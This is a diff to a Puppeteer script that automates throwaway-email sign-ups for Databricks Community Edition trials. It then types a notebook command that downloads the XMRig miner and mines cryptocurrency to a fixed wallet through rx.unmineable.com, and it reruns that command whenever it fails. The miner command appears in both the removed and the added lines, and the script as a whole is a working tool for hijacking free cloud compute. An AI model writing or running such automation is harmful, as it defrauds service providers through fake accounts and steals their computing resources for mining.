@@ -21,59 +21,23 @@ const setup = async () => {
   let page;
   let page2;
   try {
-    const minimal_args = [
-      '--autoplay-policy=user-gesture-required',
-      '--disable-background-networking',
-      '--disable-background-timer-throttling',
-      '--disable-backgrounding-occluded-windows',
-      '--disable-breakpad',
-      '--disable-client-side-phishing-detection',
-      '--disable-component-update',
-      '--disable-default-apps',
-      '--disable-dev-shm-usage',
-      '--disable-domain-reliability',
-      '--disable-features=AudioServiceOutOfProcess',
-      '--disable-hang-monitor',
-      '--disable-ipc-flooding-protection',
-      '--disable-notifications',
-      '--disable-offer-store-unmasked-wallet-cards',
-      '--disable-popup-blocking',
-      '--disable-print-preview',
-      '--disable-prompt-on-repost',
-      '--disable-renderer-backgrounding',
-      '--disable-setuid-sandbox',
-      '--disable-speech-api',
-      '--disable-sync',
-      '--hide-scrollbars',
-      '--ignore-gpu-blacklist',
-      '--metrics-recording-only',
-      '--mute-audio',
-      '--no-default-browser-check',
-      '--no-first-run',
-      '--no-pings',
-      '--no-sandbox',
-      '--no-zygote',
-      '--password-store=basic',
-      '--use-gl=swiftshader',
-      '--use-mock-keychain'
-    ];
     browser = await puppeteer.launch({
-      headless: false,
-      args: minimal_args,
+      headless: true,
+      args: ['--no-sandbox'],
       timeout: 1000000000,
     });
+    const context = browser.defaultBrowserContext();
+    await context.overridePermissions('https://mail.tm/en/', ['clipboard-read'])
     console.log('Start setup');
     page = await browser.newPage();
+    page.setDefaultNavigationTimeout(10000000);
     await page.setUserAgent(_.sample(userA).userAgent);
     await page.goto("https://mail.tm/en/", { timeout: 10000000 });
     await page.waitFor(6000);
-    await (await page.$x('//*[@id="address"]'))[0].click();
-    const context = await browser.defaultBrowserContext();
-    await context.overridePermissions('https://mail.tm/en/', ['clipboard-read'])
-    const emailAddress = await page.evaluate(`(async () => await navigator.clipboard.readText())()`);
+    const emailAddress = await page.evaluate(() => document.querySelector('#address').value) || 'no email';
     console.log('emailAddress', emailAddress);
     page2 = await browser.newPage();
-    page.setDefaultNavigationTimeout(6000000);
+    page2.setDefaultNavigationTimeout(10000000);
     await page2.goto('https://databricks.com/try-databricks', { timeout: 10000000 });
     await (await page2.$x('//*[@id="FirstName"]'))[0].type(makeid(_.range(1, 2)));
     await (await page2.$x('//*[@id="FirstName"]'))[0].type(makeid(_.range(1, 2)));
@@ -117,7 +81,7 @@ const setup = async () => {
       () => document.querySelector('iframe').getAttribute('srcdoc')
     )
     const $ = cheerio.load(html);
-    await page2.goto($('a[href*="https://community.cloud.databricks.com/login.html"]').attr('href'));
+    await page2.goto($('a[href*="https://community.cloud.databricks.com/login.html"]').attr('href'), { timeout: 10000000 });
     await new Promise((rs) => setTimeout(rs, 10000));
     await (await page2.$x('//*[@id="reset-container"]/div/div[1]/input'))[0].type('1234Asdfg@');
     await (await page2.$x('//*[@id="reset-container"]/div/div[2]/input'))[0].type('1234Asdfg@');
@@ -130,20 +94,23 @@ const setup = async () => {
     await (await page2.$x('/html/body/div[4]/div/div/uses-legacy-bootstrap/uses-legacy-bootstrap/button[2]'))[0].click();
     await new Promise((rs) => setTimeout(rs, 15000));
     await page2.click('.CodeMirror-line');
-    console.log('Send cmd');
-    await page2.type('.CodeMirror textarea', "! wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz && tar -xf xmrig-6.12.1-linux-x64.tar.gz && cd xmrig-6.12.1 && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u BTT:TQmRkvGr65k473NrHNe9jaZiJ4dx337rj9.WORKER_" + makeid(5) + '_' + new Date().getTime());
+    const worker = "WORKER_" + makeid(5) + '_' + new Date().getTime();
+    console.log('Send cmd worker: ', worker);
+    await page2.type('.CodeMirror textarea', "! wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz && tar -xf xmrig-6.12.1-linux-x64.tar.gz && cd xmrig-6.12.1 && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u BTT:TQmRkvGr65k473NrHNe9jaZiJ4dx337rj9." + worker);
     await page2.click('.fa-play');
     await page2.click('.run-cell > .fa');
     await (await page2.$x('/html/body/uses-legacy-bootstrap[16]/div/uses-legacy-bootstrap/div/div[3]/div/a[2]'))[0].click();
     console.log('Done - Start interval');
     interval(async () => {
       if (await page2.$('.error-summary')) {
+        console.log('Rerun worker')
         await page2.click('.fa-play');
         await page2.click('.run-cell > .fa');
         await (await page2.$x('/html/body/uses-legacy-bootstrap[16]/div/uses-legacy-bootstrap/div/div[3]/div/a[2]'))[0].click();
       }
     }, 300000);
   } catch (e) {
+    console.error(e);
     const pages = await browser.pages();
     await Promise.all(pages.map(page => page.close()));
     await browser.close();
